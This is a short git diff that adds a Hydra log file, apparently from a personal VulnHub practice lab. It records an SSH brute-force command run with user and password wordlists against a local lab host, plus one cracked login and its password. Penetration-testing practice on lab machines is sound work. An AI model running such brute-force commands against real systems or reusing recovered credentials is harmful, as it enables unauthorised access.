@@ -1,0 +1,2 @@
+# Hydra v9.3 run at 2022-08-05 19:36:12 on 192.168.1.179 ssh (/usr/bin/hydra -L /home/darthv/git/badorius/vulnhub/ica1/python/out/user.txt -P /home/darthv/git/badorius/vulnhub/ica1/python/out/pass.txt -o /home/darthv/git/badorius/vulnhub/ica1/python/out/logins.txt ssh://192.168.1.179)
+[22][ssh] host: 192.168.1.179   login: dexter   password: 7ZwV4qtg42cmUXGX
